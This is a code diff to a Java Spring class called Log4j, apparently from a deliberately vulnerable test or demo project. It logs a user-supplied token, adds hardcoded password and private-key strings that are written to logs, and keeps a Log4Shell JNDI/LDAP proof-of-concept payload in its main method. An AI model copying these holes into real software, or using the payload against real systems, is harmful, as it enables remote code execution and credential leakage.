@@ -17,13 +17,20 @@ public class Log4j {
      */
     @RequestMapping(value = "/log4j")
     public String log4j(String token) {
-        logger.error(token);
+        logger.info("token: {}", token);
+        String password = "Pass@0rd";
+        logger.info("User password is "+password);
+        String privateKey = "parivate";
+        logger.info("paramaters is {}", new Object[]{privateKey});
+        if (StringUtils.isBlank(privateKey)) {
+            logger.info("something wrong, token: {}, privateKey: {}", token, privateKey);
+        }
         return token;
     }
 
     public static void main(String[] args) {
         String poc = "${jndi:ldap://127.0.0.1:1389/0iun75}";
-        logger.error(poc);
+        logger.info(poc);
     }
 
 }
